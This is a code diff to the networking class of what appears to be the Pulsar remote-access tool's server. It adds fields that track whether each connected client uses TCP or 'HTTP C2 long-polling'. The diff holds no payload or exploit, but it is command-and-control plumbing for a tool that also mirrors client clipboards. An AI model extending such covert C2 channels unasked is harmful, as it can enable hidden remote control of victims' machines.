@@ -1,4 +1,5 @@
-﻿using Pulsar.Common.Messages.Other;
+﻿using Pulsar.Common.DNS;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Server.Forms;
 using System;
@@ -192,15 +193,30 @@ namespace Pulsar.Server.Networking
         /// </summary>
         public UserState Value { get; set; }
 
-    /// <summary>
-    /// Indicates whether this client currently allows clipboard mirroring to the server host.
-    /// </summary>
-    public bool ClipboardSyncEnabled { get; set; }
+        /// <summary>
+        /// Indicates whether this client currently allows clipboard mirroring to the server host.
+        /// </summary>
+        public bool ClipboardSyncEnabled { get; set; }
 
         /// <summary>
         /// The Endpoint which the client is connected to.
         /// </summary>
         public IPEndPoint EndPoint { get; }
+
+        /// <summary>
+        /// Identifies the transport used by the client (TCP vs HTTP long-poll).
+        /// </summary>
+        public TransportKind Transport { get; internal set; } = TransportKind.Tcp;
+
+        /// <summary>
+        /// Human-readable endpoint string for display and diagnostics.
+        /// </summary>
+        public string TransportEndpoint { get; internal set; } = string.Empty;
+
+        /// <summary>
+        /// Indicates whether the client is communicating via HTTP C2 long-polling.
+        /// </summary>
+        public bool IsHttpTransport => Transport == TransportKind.HttpsLongPoll;
 
         /// <summary>
         /// The header size in bytes.
@@ -214,6 +230,8 @@ namespace Pulsar.Server.Networking
                 Identified = false;
                 Value = new UserState();
                 EndPoint = endPoint;
+                TransportEndpoint = endPoint?.ToString() ?? string.Empty;
+                Transport = TransportKind.Tcp;
                 ConnectedTime = DateTime.UtcNow;
                 _stream = stream ?? throw new ArgumentNullException(nameof(stream));
                 _serverCertificate = serverCertificate ?? throw new ArgumentNullException(nameof(serverCertificate));
